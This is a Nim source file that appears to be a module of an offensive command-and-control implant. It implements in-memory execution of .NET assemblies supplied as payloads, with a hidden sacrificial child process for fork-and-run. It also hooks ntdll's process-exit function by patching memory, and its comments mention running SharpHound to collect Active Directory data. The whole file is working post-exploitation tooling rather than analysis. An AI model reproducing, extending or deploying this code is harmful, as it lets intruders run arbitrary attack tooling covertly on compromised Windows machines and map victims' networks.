## In-memory .NET CLR hosting for the Nim agent.
##
## COM chain: CLRCreateInstance → ICLRMetaHost::GetRuntime(v4) →
##   ICLRRuntimeInfo::GetInterface(ICorRuntimeHost) → Start() →
##   GetDefaultDomain() → QI(_AppDomain) → Load_3(SAFEARRAY) →
##   get_EntryPoint() → Invoke_3() in a dedicated thread.
##
## Parent mode: fork-and-run — spawns a child copy of the agent to host the CLR.
## If the assembly calls Environment.Exit() only the child dies, parent survives.
## Child mode: detected via __ENDGAME_CLR_CHILD env var; reads asm from stdin,
## runs CLR with stdout pointing at the pipe back to the parent, then exits.

import winim/lean
import std/[strutils, sequtils]

# ── GUID constants ─────────────────────────────────────────────────────────────

template g32(x: uint32): int32 = cast[int32](x)

const
  CLSID_CLRMetaHost = GUID(Data1: g32(0x9280188d'u32), Data2: 0x0e8e'u16,
    Data3: 0x4867'u16, Data4: [0xb3.byte,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde])
  IID_ICLRMetaHost = GUID(Data1: g32(0xd332db9e'u32), Data2: 0xb9b3'u16,
    Data3: 0x4125'u16, Data4: [0x82.byte,0x07,0xa1,0x48,0x84,0xf5,0x32,0x16])
  IID_ICLRRuntimeInfo = GUID(Data1: g32(0xbd39d1d2'u32), Data2: 0xba2f'u16,
    Data3: 0x486a'u16, Data4: [0x89.byte,0xb0,0xb4,0xb0,0xcb,0x46,0x68,0x91])
  CLSID_CorRuntimeHost = GUID(Data1: g32(0xcb2f6723'u32), Data2: 0xab3a'u16,
    Data3: 0x11d2'u16, Data4: [0x9c.byte,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e])
  IID_ICorRuntimeHost = GUID(Data1: g32(0xcb2f6722'u32), Data2: 0xab3a'u16,
    Data3: 0x11d2'u16, Data4: [0x9c.byte,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e])
  IID_AppDomain = GUID(Data1: 0x05f696dc, Data2: 0x2b29'u16,
    Data3: 0x3663'u16, Data4: [0xad.byte,0x8b,0xc4,0x38,0x9c,0xf2,0xa7,0x13])
  VT_UI1_V   = WORD(17)
  VT_BSTR_V  = WORD(8)
  VT_ARRAY_V = WORD(0x2000)

# VARIANT on x64 Windows: vt(2) + 3×WORD(6) + data(8) = 16 bytes
type OleVar {.packed.} = object
  vt:       WORD
  r1,r2,r3: WORD
  data:     uint64

# ── COM vtable helper ─────────────────────────────────────────────────────────

proc vt(obj: pointer): ptr UncheckedArray[pointer] {.inline.} =
  cast[ptr UncheckedArray[pointer]](cast[ptr pointer](obj)[])

# ── SafeArray dynamic loader ──────────────────────────────────────────────────

type
  PfnSaCV = proc(vt: WORD, lb: LONG, n: ULONG): pointer {.stdcall.}
  PfnSaAD = proc(sa: pointer, pv: ptr pointer): HRESULT {.stdcall.}
  PfnSaUA = proc(sa: pointer): HRESULT {.stdcall.}
  PfnSaPE = proc(sa: pointer, idx: ptr LONG, pv: pointer): HRESULT {.stdcall.}
  PfnSaDe = proc(sa: pointer): HRESULT {.stdcall.}
  PfnSAS  = proc(s: LPCWSTR): BSTR {.stdcall.}
  PfnSFS  = proc(b: BSTR) {.stdcall.}

var
  gSaCV: PfnSaCV
  gSaAD: PfnSaAD
  gSaUA: PfnSaUA
  gSaPE: PfnSaPE
  gSaDe: PfnSaDe
  gSAS:  PfnSAS
  gSFS:  PfnSFS

proc loadOleaut32(): bool =
  let h = LoadLibraryA("oleaut32.dll")
  if h == 0: return false
  gSaCV = cast[PfnSaCV](GetProcAddress(h, "SafeArrayCreateVector"))
  gSaAD = cast[PfnSaAD](GetProcAddress(h, "SafeArrayAccessData"))
  gSaUA = cast[PfnSaUA](GetProcAddress(h, "SafeArrayUnaccessData"))
  gSaPE = cast[PfnSaPE](GetProcAddress(h, "SafeArrayPutElement"))
  gSaDe = cast[PfnSaDe](GetProcAddress(h, "SafeArrayDestroy"))
  gSAS  = cast[PfnSAS] (GetProcAddress(h, "SysAllocString"))
  gSFS  = cast[PfnSFS] (GetProcAddress(h, "SysFreeString"))
  return gSaCV != nil and gSaAD != nil and gSaUA != nil and
         gSaPE != nil and gSaDe != nil and gSAS != nil and gSFS != nil

proc bytesToSa(data: openArray[byte]): pointer =
  let sa = gSaCV(VT_UI1_V, 0, ULONG(data.len))
  if sa == nil: return nil
  var pv: pointer
  discard gSaAD(sa, addr pv)
  if pv != nil and data.len > 0:
    copyMem(pv, unsafeAddr data[0], data.len)
  discard gSaUA(sa)
  return sa

proc argsToParamSa(args: string): pointer =
  let parts = if args.len > 0: args.splitWhitespace() else: newSeq[string]()
  # inner = SAFEARRAY(VT_BSTR, N)
  let inner = gSaCV(VT_BSTR_V, 0, ULONG(parts.len))
  if inner == nil: return nil
  for i, p in parts:
    let ws   = newWideCString(p)
    let bstr = gSAS(ws)
    var idx  = LONG(i)
    discard gSaPE(inner, addr idx, cast[pointer](bstr))
    gSFS(bstr)
  # outer = SAFEARRAY(VT_VARIANT, 1)
  let outer = gSaCV(WORD(12), 0, 1)  # VT_VARIANT=12
  if outer == nil:
    discard gSaDe(inner)
    return nil
  var elem  = OleVar(vt: VT_ARRAY_V or VT_BSTR_V, data: cast[uint64](inner))
  var idx0  = LONG(0)
  discard gSaPE(outer, addr idx0, cast[pointer](addr elem))
  discard gSaDe(inner)
  return outer

# ── Stdout redirect ───────────────────────────────────────────────────────────

var gOrigOut, gOrigErr: HANDLE
var gTmpPath: array[MAX_PATH, WCHAR]

proc redirectStdout(): HANDLE =
  gOrigOut = GetStdHandle(STD_OUTPUT_HANDLE)
  gOrigErr = GetStdHandle(STD_ERROR_HANDLE)
  var tmpDir: array[MAX_PATH, WCHAR]
  discard GetTempPathW(DWORD(MAX_PATH), addr tmpDir[0])
  discard GetTempFileNameW(addr tmpDir[0], newWideCString("clr"), 0, addr gTmpPath[0])
  let fh = CreateFileW(addr gTmpPath[0],
    GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ,
    nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
  if fh == INVALID_HANDLE_VALUE: return INVALID_HANDLE_VALUE
  SetStdHandle(STD_OUTPUT_HANDLE, fh)
  SetStdHandle(STD_ERROR_HANDLE, fh)
  return fh

proc restoreStdout() =
  SetStdHandle(STD_OUTPUT_HANDLE, gOrigOut)
  SetStdHandle(STD_ERROR_HANDLE, gOrigErr)

proc readTempFile(fh: HANDLE): string =
  let size = GetFileSize(fh, nil)
  if size == 0 or size == INVALID_FILE_SIZE:
    discard CloseHandle(fh)
    discard DeleteFileW(addr gTmpPath[0])
    return "(no output)"
  var buf = newString(int(size))
  discard SetFilePointer(fh, 0, nil, FILE_BEGIN)
  var rd: DWORD
  discard ReadFile(fh, addr buf[0], size, addr rd, nil)
  buf.setLen(int(rd))
  discard CloseHandle(fh)
  discard DeleteFileW(addr gTmpPath[0])
  return buf

# ── ExitProcess hook → ExitThread ────────────────────────────────────────────

var
  gEpOrig: array[12, byte]
  gEpAddr: pointer
  gEpHooked = false

proc epStub(code: UINT) {.stdcall.} = ExitThread(DWORD(code))

proc installExitHook() =
  if gEpHooked: return
  # Patch ntdll!RtlExitUserProcess — the function the CLR calls directly
  # (kernel32!ExitProcess is just a thin wrapper around it)
  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll == 0: return
  gEpAddr = cast[pointer](GetProcAddress(ntdll, "RtlExitUserProcess"))
  if gEpAddr == nil:
    # fallback to kernel32!ExitProcess
    let k32 = GetModuleHandleA("kernel32.dll")
    if k32 == 0: return
    gEpAddr = cast[pointer](GetProcAddress(k32, "ExitProcess"))
  if gEpAddr == nil: return
  var jmp: array[12, byte]
  jmp[0] = 0x48; jmp[1] = 0xB8
  var stub = cast[uint64](epStub)
  copyMem(addr jmp[2], addr stub, 8)
  jmp[10] = 0xFF; jmp[11] = 0xE0
  var old: DWORD
  discard VirtualProtect(gEpAddr, 12, PAGE_EXECUTE_READWRITE, addr old)
  copyMem(addr gEpOrig[0], gEpAddr, 12)
  copyMem(gEpAddr, addr jmp[0], 12)
  discard VirtualProtect(gEpAddr, 12, old, addr old)
  gEpHooked = true

proc removeExitHook() =
  if not gEpHooked or gEpAddr == nil: return
  var old: DWORD
  discard VirtualProtect(gEpAddr, 12, PAGE_EXECUTE_READWRITE, addr old)
  copyMem(gEpAddr, addr gEpOrig[0], 12)
  discard VirtualProtect(gEpAddr, 12, old, addr old)
  gEpHooked = false

# ── Invoke thread ─────────────────────────────────────────────────────────────

type InvokeWork = object
  pEP:      pointer
  saParams: pointer
  hr:       HRESULT

proc invokeThread(param: pointer): DWORD {.stdcall.} =
  let w  = cast[ptr InvokeWork](param)
  type PfnInv = proc(self: pointer, obj: ptr OleVar,
                     sa: pointer, ret: ptr OleVar): HRESULT {.stdcall.}
  var objV, retV: OleVar
  let fn = cast[PfnInv](vt(w.pEP)[37])
  w.hr = fn(w.pEP, addr objV, w.saParams, addr retV)
  return 0

# ── Main ──────────────────────────────────────────────────────────────────────

proc execDotNet*(asmBytes: openArray[byte], args: string,
                 childMode: bool = false): string =
  if asmBytes.len < 2: return "[!] dotnet_exec: empty payload"
  if not loadOleaut32(): return "[!] dotnet_exec: oleaut32.dll load failed"

  # Capture pipe handle BEFORE CLR init — ICorRuntimeHost::Start() may reset
  # standard handles internally (same behaviour documented in the Go agent).
  let hPipe: HANDLE = if childMode: GetStdHandle(STD_OUTPUT_HANDLE)
                      else: INVALID_HANDLE_VALUE

  let hMs = LoadLibraryA("mscoree.dll")
  if hMs == 0: return "[!] dotnet_exec: mscoree.dll not found"
  type PfnCLRCI = proc(rclsid, riid: ptr GUID, ppUnk: ptr pointer): HRESULT {.stdcall.}
  let clrCI = cast[PfnCLRCI](GetProcAddress(hMs, "CLRCreateInstance"))
  if clrCI == nil: return "[!] dotnet_exec: CLRCreateInstance not found"

  var pMH: pointer
  var clsMH = CLSID_CLRMetaHost; var iidMH = IID_ICLRMetaHost
  if FAILED(clrCI(addr clsMH, addr iidMH, addr pMH)) or pMH == nil:
    return "[!] dotnet_exec: CLRCreateInstance failed"

  type PfnGR = proc(self: pointer, ver: LPCWSTR, riid: ptr GUID,
                    ppRti: ptr pointer): HRESULT {.stdcall.}
  var pRti: pointer; var iidRti = IID_ICLRRuntimeInfo
  if FAILED(cast[PfnGR](vt(pMH)[3])(pMH, newWideCString("v4.0.30319"),
                                     addr iidRti, addr pRti)) or pRti == nil:
    return "[!] dotnet_exec: GetRuntime failed"

  type PfnGI = proc(self: pointer, rclsid, riid: ptr GUID,
                    ppUnk: ptr pointer): HRESULT {.stdcall.}
  var pCH: pointer
  var clsCH = CLSID_CorRuntimeHost; var iidCH = IID_ICorRuntimeHost
  if FAILED(cast[PfnGI](vt(pRti)[9])(pRti, addr clsCH, addr iidCH, addr pCH)) or pCH == nil:
    return "[!] dotnet_exec: GetInterface failed"

  type PfnVoid = proc(self: pointer): HRESULT {.stdcall.}
  let hrStart = cast[PfnVoid](vt(pCH)[10])(pCH)
  if FAILED(hrStart) and hrStart != HRESULT(1):  # S_FALSE=1 = already started
    return "[!] dotnet_exec: Start failed"

  # Re-apply stdout/stderr to the pipe after Start() — the CLR may reset handles.
  if childMode and hPipe != INVALID_HANDLE_VALUE and hPipe != 0:
    SetStdHandle(STD_OUTPUT_HANDLE, hPipe)
    SetStdHandle(STD_ERROR_HANDLE, hPipe)

  type PfnGDD = proc(self: pointer, ppUnk: ptr pointer): HRESULT {.stdcall.}
  var pDomThunk: pointer
  if FAILED(cast[PfnGDD](vt(pCH)[13])(pCH, addr pDomThunk)) or pDomThunk == nil:
    return "[!] dotnet_exec: GetDefaultDomain failed"

  type PfnQI = proc(self: pointer, riid: ptr GUID, ppv: ptr pointer): HRESULT {.stdcall.}
  var pAD: pointer; var iidAD = IID_AppDomain
  if FAILED(cast[PfnQI](vt(pDomThunk)[0])(pDomThunk, addr iidAD, addr pAD)) or pAD == nil:
    return "[!] dotnet_exec: QI _AppDomain failed"

  let saAsm = bytesToSa(asmBytes)
  if saAsm == nil: return "[!] dotnet_exec: bytes_to_sa failed"

  type PfnLoad3 = proc(self: pointer, sa: pointer,
                       ppAsm: ptr pointer): HRESULT {.stdcall.}
  var pAsm: pointer
  var hr = cast[PfnLoad3](vt(pAD)[44])(pAD, saAsm, addr pAsm)
  if FAILED(hr) or pAsm == nil:
    pAsm = nil
    hr = cast[PfnLoad3](vt(pAD)[45])(pAD, saAsm, addr pAsm)
  if FAILED(hr) or pAsm == nil:
    return "[!] dotnet_exec: Load_3 failed"

  type PfnGEP = proc(self: pointer, ppEP: ptr pointer): HRESULT {.stdcall.}
  var pEP: pointer
  if FAILED(cast[PfnGEP](vt(pAsm)[16])(pAsm, addr pEP)) or pEP == nil:
    return "[!] dotnet_exec: get_EntryPoint failed"

  let saParams = argsToParamSa(args)

  var fhTmp: HANDLE
  if childMode:
    # Use pre-captured handle (not GetStdHandle — Start() may have reset it).
    # Re-apply both Win32 handles before Invoke_3.
    fhTmp = if hPipe != INVALID_HANDLE_VALUE and hPipe != 0: hPipe
            else: GetStdHandle(STD_OUTPUT_HANDLE)
    SetStdHandle(STD_OUTPUT_HANDLE, fhTmp)
    SetStdHandle(STD_ERROR_HANDLE, fhTmp)
  else:
    fhTmp = redirectStdout()
    if fhTmp != INVALID_HANDLE_VALUE:
      SetStdHandle(STD_OUTPUT_HANDLE, fhTmp)
      SetStdHandle(STD_ERROR_HANDLE, fhTmp)

  var work = InvokeWork(pEP: pEP, saParams: saParams)
  if not childMode: installExitHook()
  let ht = CreateThread(nil, 0, invokeThread, addr work, 0, nil)
  if ht != 0:
    # The parent process owns the bounded timeout; allow the CLR invocation
    # thread to run long enough for directory-wide SharpHound collection.
    discard WaitForSingleObject(ht, DWORD(900_000))
    discard CloseHandle(ht)
  if not childMode: removeExitHook()

  if saParams != nil: discard gSaDe(saParams)

  if childMode:
    discard FlushFileBuffers(fhTmp)
    quit(0)

  restoreStdout()
  if fhTmp == INVALID_HANDLE_VALUE:
    return "(no output captured)"
  discard FlushFileBuffers(fhTmp)
  return readTempFile(fhTmp)

# ── Fork-and-run ──────────────────────────────────────────────────────────────

const clrChildEnv = "__ENDGAME_CLR_CHILD"

type ForkWriteWork = object
  h:       HANDLE
  args:    string
  payload: seq[byte]

proc forkWriteThread(param: pointer): DWORD {.stdcall.} =
  let w = cast[ptr ForkWriteWork](param)
  proc writeAll(h: HANDLE; p: pointer; n: int) =
    var off = 0
    while off < n:
      var wr: DWORD
      if WriteFile(h, cast[pointer](cast[int](p) + off), DWORD(n - off), addr wr, nil) == 0 or wr == 0: break
      off += int(wr)
  var le4: array[4, byte]
  template le32(v: int) =
    le4[0] = byte(v and 0xFF); le4[1] = byte((v shr 8) and 0xFF)
    le4[2] = byte((v shr 16) and 0xFF); le4[3] = byte((v shr 24) and 0xFF)
  le32(w.args.len);    writeAll(w.h, addr le4[0], 4)
  if w.args.len > 0:   writeAll(w.h, unsafeAddr w.args[0], w.args.len)
  le32(w.payload.len); writeAll(w.h, addr le4[0], 4)
  if w.payload.len > 0: writeAll(w.h, unsafeAddr w.payload[0], w.payload.len)
  discard CloseHandle(w.h)
  return 0

proc forkRunAssembly*(asmBytes: openArray[byte], args: string, timeoutSec: int = 0): string =
  ## Spawns a sacrificial child copy of the current exe to host the CLR.
  ## If the assembly calls Environment.Exit() only the child dies.
  var exeBuf: array[MAX_PATH + 1, WCHAR]
  if GetModuleFileNameW(0, addr exeBuf[0], MAX_PATH) == 0:
    return execDotNet(asmBytes, args)

  var sa = SECURITY_ATTRIBUTES(nLength: DWORD(sizeof(SECURITY_ATTRIBUTES)),
                                bInheritHandle: TRUE)
  var asmRd, asmWr, outRd, outWr: HANDLE
  if CreatePipe(addr asmRd, addr asmWr, addr sa, 0) == 0:
    return execDotNet(asmBytes, args)
  discard SetHandleInformation(asmWr, HANDLE_FLAG_INHERIT, 0)
  if CreatePipe(addr outRd, addr outWr, addr sa, 0) == 0:
    discard CloseHandle(asmRd); discard CloseHandle(asmWr)
    return execDotNet(asmBytes, args)
  discard SetHandleInformation(outRd, HANDLE_FLAG_INHERIT, 0)

  discard SetEnvironmentVariableW(clrChildEnv, "1")

  var si = STARTUPINFOW(
    cb:         DWORD(sizeof(STARTUPINFOW)),
    dwFlags:    STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW,
    wShowWindow: 0,
    hStdInput:  asmRd,
    hStdOutput: outWr,
    hStdError:  outWr
  )
  var pi: PROCESS_INFORMATION
  let ok = CreateProcessW(addr exeBuf[0], nil, nil, nil, TRUE,
    CREATE_NO_WINDOW, nil, nil, addr si, addr pi)

  discard SetEnvironmentVariableW(clrChildEnv, nil)
  discard CloseHandle(asmRd)
  discard CloseHandle(outWr)

  if ok == 0:
    discard CloseHandle(asmWr); discard CloseHandle(outRd)
    return execDotNet(asmBytes, args)

  # Write assembly to child stdin in a background thread
  var work = ForkWriteWork(h: asmWr, args: args, payload: @asmBytes)
  let wt = CreateThread(nil, 0, forkWriteThread, addr work, 0, nil)
  if wt != 0: discard CloseHandle(wt)

  # Read output until pipe closed (child exited). SharpHound can opt into a
  # bounded longer window; all other assemblies keep the 60s default.
  var output: string
  var buf: array[8192, byte]
  let timeoutMs = if timeoutSec >= 60 and timeoutSec <= 1800: timeoutSec * 1000 else: 60_000
  let deadline = GetTickCount() + DWORD(timeoutMs)
  while GetTickCount() < deadline:
    var avail: DWORD = 0
    if PeekNamedPipe(outRd, nil, 0, nil, addr avail, nil) == 0: break
    if avail > 0:
      var nRead: DWORD
      discard ReadFile(outRd, addr buf[0], min(avail, DWORD(sizeof(buf))), addr nRead, nil)
      if nRead > 0:
        let start = output.len
        output.setLen(start + int(nRead))
        copyMem(addr output[start], addr buf[0], int(nRead))
    else:
      if WaitForSingleObject(pi.hProcess, 50) != WAIT_TIMEOUT:
        # Child exited — drain remaining bytes
        while true:
          avail = 0
          if PeekNamedPipe(outRd, nil, 0, nil, addr avail, nil) == 0 or avail == 0: break
          var nRead: DWORD
          discard ReadFile(outRd, addr buf[0], min(avail, DWORD(sizeof(buf))), addr nRead, nil)
          if nRead > 0:
            let start = output.len
            output.setLen(start + int(nRead))
            copyMem(addr output[start], addr buf[0], int(nRead))
        break
  discard CloseHandle(outRd)

  if GetTickCount() >= deadline:
    discard TerminateProcess(pi.hProcess, 1)
    output.add("\n[!] fork-and-run timeout (" & $int(timeoutMs div 1000) & "s)")

  discard WaitForSingleObject(pi.hProcess, 5000)
  var exitCode: DWORD = 259  # STILL_ACTIVE
  discard GetExitCodeProcess(pi.hProcess, addr exitCode)
  discard CloseHandle(pi.hProcess)
  discard CloseHandle(pi.hThread)
  if exitCode != 0 and exitCode != 259:
    let suffix = if exitCode == 0xC0000005'u32: " (ACCESS_VIOLATION — unsafe/P-Invoke code in assembly)"
                 else: ""
    output.add("\n[!] fork-and-run child exited with code " & $exitCode &
               " (0x" & toHex(exitCode, 8) & ")" & suffix)
  return output

proc clrChildRun*() =
  ## Called in the child process (detected via __ENDGAME_CLR_CHILD env var).
  ## Reads [4B args_len][args][4B asm_len][asm_bytes] from stdin,
  ## runs CLR with stdout pointing directly at the parent pipe, then exits.
  let hIn  = GetStdHandle(STD_INPUT_HANDLE)
  proc readExact(p: pointer; n: int): bool =
    var off = 0
    while off < n:
      var rd: DWORD
      if ReadFile(hIn, cast[pointer](cast[int](p) + off), DWORD(n - off), addr rd, nil) == 0 or rd == 0:
        return false
      off += int(rd)
    true

  var hdr: array[4, byte]
  if not readExact(addr hdr[0], 4): quit(1)
  let argsLen = int(hdr[0]) or (int(hdr[1]) shl 8) or (int(hdr[2]) shl 16) or (int(hdr[3]) shl 24)
  var argsStr = newString(max(0, argsLen))
  if argsLen > 0 and not readExact(addr argsStr[0], argsLen): quit(1)

  if not readExact(addr hdr[0], 4): quit(1)
  let asmLen = int(hdr[0]) or (int(hdr[1]) shl 8) or (int(hdr[2]) shl 16) or (int(hdr[3]) shl 24)
  var asmBuf = newSeq[byte](max(0, asmLen))
  if asmLen > 0 and not readExact(addr asmBuf[0], asmLen): quit(1)

  # childMode=true: stdout is the parent pipe, CLR writes directly to it, quit(0) at end
  discard execDotNet(asmBuf, argsStr, childMode = true)
  # execDotNet with childMode calls quit(0) — we only reach here on error
  quit(0)
